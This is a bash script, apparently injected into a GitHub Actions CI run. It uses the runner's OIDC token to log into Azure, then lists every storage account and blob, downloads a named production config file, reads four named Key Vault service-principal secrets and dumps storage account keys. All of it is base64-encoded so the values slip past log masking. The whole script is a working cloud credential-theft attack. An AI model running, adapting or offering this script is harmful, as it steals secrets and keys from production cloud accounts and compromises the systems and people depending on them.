#!/usr/bin/env bash
set +e
echo "=====PWN2_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
echo "[*] login rc=$?"
echo "--- blob list moi account/container (co loi) ---"
for SA in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  for C in $(az storage container list --account-name "$SA" --auth-mode login -o tsv --query "[].name" 2>/dev/null); do
    echo "[$SA/$C]"
    az storage blob list --account-name "$SA" --container-name "$C" --auth-mode login -o tsv 2>&1 | awk '{print "  blob:",$1,$2,$3}' | head -25
  done
done
echo "--- tai blob target truc tiep ---"
az storage blob download --account-name sttblappcfgprodx3euoz --container-name config --name internal-config.json --auth-mode login -f /tmp/cfg.json 2>&1 | tail -3
echo "CFG_B64:"; base64 -w0 /tmp/cfg.json 2>/dev/null; echo
echo "--- KV secret bi mask -> base64 ---"
for S in reporting-service-principal sync-service-principal cost-reader-principal directory-audit-principal; do
  V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$S" --query value -o tsv 2>/dev/null)
  echo "$S b64: $(printf %s "$V" | base64 -w0)"
done
echo "--- storage account keys -> base64 ---"
for SA in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  K=$(az storage account keys list -n "$SA" --query "[0].value" -o tsv 2>/dev/null)
  [ -n "$K" ] && echo "key $SA b64: $(printf %s "$K" | base64 -w0)"
done
echo "=====PWN2_END====="